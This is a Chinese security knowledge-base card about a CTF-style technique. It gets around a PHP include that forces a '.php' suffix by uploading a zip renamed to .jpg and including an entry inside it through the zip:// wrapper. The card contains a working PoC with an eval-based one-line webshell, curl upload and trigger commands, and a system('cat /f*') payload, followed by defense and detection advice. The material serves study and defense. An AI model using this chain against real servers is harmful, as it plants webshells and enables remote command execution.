---
id: web-php-file-inclusion-zip-wrapper-forced-suffix
title: 强制拼接 .php 后缀的 include 绕过：zip:// 包内条目吸收后缀执行压缩包木马
type: scenario
domain: web
path: web/php/file-inclusion
technique: zip-wrapper-forced-suffix-include
aliases:
- zip:// 伪协议
- 强制后缀绕过
- 压缩包图片马
- include($file.'.php')
- zip 伪协议 getshell
tags:
- php
- file-inclusion
- zip
- stream-wrapper
- webshell
- lfi
- upload
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V158
  verified_at: '2026-11-06T07:34:01+08:00'
  notes: '已对照原文 Pandora Box 源码与截图核对：include($file . ''.php'') 固定拼接；上传仅允许 jpg/png（页面提示“所有文件最终将被强制视为 PHP 脚本”），zip 改名 jpg 上传落在 upload/；?file=zip://upload/f344...jpg%23ma 拼接为 #ma.php，zip 流包装器按条目名解析并执行包内 PHP，图5显示 flag 回显，链路与卡一致。未验证点：未本机复跑，依赖 zip 扩展开启且 allow_url_include 非必需；CTF 环境无版本，未设 affected_versions；frontmatter 无 sources/source_url。'
---

## 一句话结论

当 `include` 在用户输入后强制拼接 `.php` 时，可上传一个改名为 `.jpg` 的 zip（内含 `ma.php`），再请求 `?file=zip://upload/x.jpg%23ma`；拼接后的 `zip://upload/x.jpg#ma.php` 中 `.php` 落在压缩包内部条目名上，zip 流包装器照样打开并执行包内 PHP。

## 原理

- PHP 的 `zip://` 流包装器格式为 `zip://<archive>#<entry>`，`#` 之后是压缩包内条目名，与外层归档文件的扩展名无关。
- 代码 `include($file . '.php')` 在字符串末尾追加 `.php`；当 `$file = zip://upload/x.jpg#ma` 时，拼接结果为 `zip://upload/x.jpg#ma.php`。追加的后缀作用于条目名，而不是外层归档文件名。
- 上传校验若只看外层扩展名或 MIME（zip 改名为 jpg），归档文件仍会落盘到可访问目录；PHP 启用 zip 扩展时包装器可读取归档条目并作为 PHP 执行。
- 之所以成立：字符串拼接发生在协议解析之前，包装器按最终字符串解析 archive 与 entry；外层文件真实格式与扩展名不参与 include 的解析判断。

## 触发条件

- 存在 `include($file . '.php')`、`require($file . '.php')` 等固定后缀拼接。
- 攻击者可上传 zip（即使被白名单/改名成 jpg、png）到 Web 可访问目录，且知道返回路径。
- PHP 启用 zip 扩展，`zip://` 未被 `open_basedir` 或自定义流包装器限制阻断。

## 利用步骤

1. 本地创建 `ma.php`，内容为一句话木马 `<?php @eval($_POST['pass']); ?>`。
2. 打包：`zip ma.zip ma.php`，再把 `ma.zip` 改名为 `ma.jpg` 上传（绕过只检查扩展名/MIME 的上传校验）。
3. 记录上传返回路径，例如 `upload/f344391640e99035dcf6b49b74f3c7da.jpg`。
4. 请求 `?file=zip://upload/f344391640e99035dcf6b49b74f3c7da.jpg%23ma`；`#` 必须 URL 编码为 `%23`，否则会被浏览器/服务端当作 fragment 截断。
5. 拼接后的 include 路径为 `zip://upload/f344....jpg#ma.php`，执行包内 `ma.php`；POST `pass=system("cat /f*");` 读取 flag。

## PoC

```bash
printf '<?php @eval($_POST["pass"]); ?>' > ma.php
zip ma.zip ma.php
mv ma.zip ma.jpg
curl -F 'file=@ma.jpg' 'http://target/upload.php'
curl 'http://target/index.php?file=zip://upload/ma.jpg%23ma' \
     --data 'pass=system("cat /f*");'
```

无独立 exploit 代码；以上为最小复现流程。

## 变体与关联

- 变体：条目名直接写全名 `ma.php`，payload 改为 `%23ma.php`（若外层不再强制追加后缀则无需本技巧）。
- 变体：嵌套目录条目 `dir/ma.php`，用 `%23dir/ma.php` 指定。
- 变体：`phar://` 包装器同样可包含归档内 PHP 或触发反序列化（需 phar 扩展）；`data://`/`php://filter` 需要 `allow_url_include` 或特定配置，而 `zip://` 不依赖 `allow_url_include`。
- 关联：文件包含、图片马、phar 反序列化、上传白名单绕过。

## 检测与防御

- 不要在 include 中拼接固定后缀；改用 `realpath()` + 白名单目录/文件名前缀校验，并拒绝流包装器字符串。
- `open_basedir` 限制可访问路径；不需要时移除 zip/phar 扩展。
- 上传目录禁止 PHP 解析（如 Apache `php_admin_flag engine off`、Nginx 不转发到 PHP-FPM），文件存储在 Web 根之外。
- 检测：日志中出现 `zip://`、`phar://`、`%23` 等特征；上传文件魔数为 `PK\x03\x04` 但扩展名为图片。
- 代码审计：搜索 `include($_GET`、`include($file .`、`require` 拼接、`include_once` 拼接。
